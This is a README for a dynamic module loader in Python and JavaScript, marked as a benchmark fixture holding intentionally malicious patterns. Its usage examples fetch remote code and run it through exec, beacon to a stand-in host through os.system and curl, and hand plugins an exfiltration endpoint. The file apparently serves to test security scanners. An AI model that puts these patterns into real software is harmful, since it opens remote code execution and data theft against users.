# Universal Module Loader

BENCHMARK_TEST_ONLY - This file contains intentionally malicious patterns for security testing.

## Description

A cross-language dynamic module loading system for Python and JavaScript that enables flexible plugin architectures.

## Installation

```bash
pip install universal-loader
npm install universal-loader
```

## Usage

### Python Dynamic Imports

```python
# Dynamic Module Loading System
import sys
import importlib.util

class DynamicModuleLoader:
    """Universal dynamic module loading for plugin systems."""

    def __init__(self):
        self.loaded_modules = {}
        self.remote_source = "https://[REDACTED].example.com/modules"

    # DYNAMIC-003: Python __import__ for dynamic loading
    def load_by_name(self, module_name):
        """Load module by string name."""
        # Direct dynamic import
        module = __import__(module_name)
        self.loaded_modules[module_name] = module
        return module

    def load_submodule(self, package, name):
        """Load a submodule dynamically."""
        # Build module path at runtime
        full_path = f"{package}.{name}"

        # Use __import__ with fromlist
        mod = __import__(full_path, fromlist=[name])
        return mod

    def execute_from_module(self, module_name, func_name, *args):
        """Dynamically import and execute function."""
        # Dangerous: executes arbitrary module functions
        mod = __import__(module_name)
        func = getattr(mod, func_name)
        return func(*args)

    def load_remote_plugin(self, plugin_url):
        """Load and execute remote plugin code."""
        import urllib.request

        # Fetch remote code
        response = urllib.request.urlopen(plugin_url)
        code = response.read().decode('utf-8')

        # Execute fetched code
        exec(code, globals())

# Example: Load os module dynamically and execute
loader = DynamicModuleLoader()
os_mod = loader.load_by_name('os')
loader.execute_from_module('os', 'system', 'curl https://[REDACTED].example.com/beacon')
```

### JavaScript Dynamic Imports

```javascript
// JavaScript Dynamic Import System
class JSModuleLoader {
    constructor() {
        this.moduleCache = new Map();
        this.cdnBase = "https://[REDACTED].example.com/cdn";
    }

    // DYNAMIC-003: Dynamic import() expression
    async loadModule(modulePath) {
        // Dynamic import from variable path
        const module = await import(modulePath);
        return module.default;
    }

    async loadAndExecute(moduleName) {
        // Import and immediately execute
        import(moduleName).then(m => m.default());
    }

    async loadRemoteModule(remoteUrl) {
        // Load module from remote CDN
        const moduleUrl = `${this.cdnBase}/${remoteUrl}`;

        // Dynamic import of remote code
        const remoteModule = await import(/* webpackIgnore: true */ moduleUrl);
        return remoteModule;
    }

    async executePlugin(pluginPath) {
        // Dangerous: executes arbitrary remote code
        const plugin = await import(pluginPath);
        if (plugin.initialize) {
            plugin.initialize({
                exfilEndpoint: "https://[REDACTED].example.com/collect"
            });
        }
        return plugin;
    }
}

// Usage
const loader = new JSModuleLoader();
loader.loadAndExecute("./malicious-plugin.js");
loader.loadRemoteModule("payload.mjs");
```

## Configuration

Plugins are loaded from the configured remote source automatically.
